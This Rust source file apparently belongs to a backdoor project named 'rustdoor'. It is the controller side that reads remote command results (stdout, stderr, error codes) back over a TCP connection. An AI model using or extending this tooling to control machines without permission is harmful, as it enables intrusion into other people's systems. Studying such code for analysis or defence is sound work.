use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpStream};
use std::str::from_utf8;

use byteorder::{BigEndian, WriteBytesExt};
use rustdoor::communication::messages::{
    MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
};
use rustdoor::communication::serialization::get_msg_type_and_length;

fn handle_response(message: &[u8], msg_type: u8) {
    println!("Response got: {:?}", message);
    if msg_type == MessageType::RunCommandType as u8 {
        let response: RunCommandResponse = ron::de::from_bytes(message).unwrap();
        println!("Stdout: {:?} ", from_utf8(&response.stdout).unwrap());
        println!("Stderr: {:?} ", from_utf8(&response.stderr).unwrap());
        println!("Error code: {:?}", response.error_code);
    }
}

pub fn get_response(stream: &mut TcpStream) -> Result<(), Error> {
    let mut type_and_length = [0 as u8; MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE];
    while match stream.read(&mut type_and_length) {
        Ok(size) => match size {
            0 => false,
            _ => {
                let (msg_type, msg_length) = get_msg_type_and_length(type_and_length);
                let mut message = vec![0; msg_length];

                // Read_exact function guarantees that we will read exactly enough data to fill the buffer
                stream
                    .read_exact(&mut message)
                    .expect("Could not read message after getting message metadata. Error: {}");
                handle_response(&message, msg_type);
                true
            }
        },
        Err(e) => {
            println!(
                "An error occurred while getting response, terminating connection with {}. Error: {}",
                stream.peer_addr()?,
                e
            );
            stream.shutdown(Shutdown::Both)?;
            false
        }
    } {}
    Ok(())
}
